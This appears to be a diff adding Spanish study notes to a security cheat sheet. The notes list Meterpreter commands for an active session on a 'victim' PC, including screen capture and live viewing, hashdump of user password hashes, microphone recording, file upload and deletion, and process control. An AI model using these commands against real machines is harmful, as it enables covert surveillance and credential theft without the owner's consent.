@@ -903,6 +903,24 @@ second-app:
 --- El cifrado es usado para que la data la enviarse o compartirse solo pueda leerse por el receptor de confianza al compartirse una clave secreta
 
 
+++ Meterpreter comandos útiles (ya teniendo la sesión activa)
+--- screenshot (Tomar captura del escritorio)
+--- screenshare (Ver en tiempo real el escritorio)
+--- Ctrl + C para parar la visualización
+--- pwd (Conocer el directorio en el cual nos encontramos en la pc de la victima)
+--- dir (Listar los directorios de la pc de la víctima)
+--- cd <ruta> (Navegar a la ruta que deseemos de la pc de la victima>
+--- cd .. (Regresar a la ruta anterior de la pc de la victima>
+--- upload <nombre_archivo> (Para mandar un archivo a la victima)
+--- rm <combre_archivo> (Para eliminar un archivo de la victima)
+--- hashdump (Muestra la lista de los usuarios y sus hashs)
+--- record_mic <tiempo> (Grabar el audio del equipo por x tiempo)
+--- execute <nombre_proceso> (Abrir algún programa, ejemplo: execute firefox.exe)
+--- pkill <nombre_proceso> (Cerrar algún programa, ejemplo: pkill paint.exe)
+--- reboot (Reiniciar el equipo)
+--- help (Ver todos los demás comandos útiles)
+
+
 
 
 
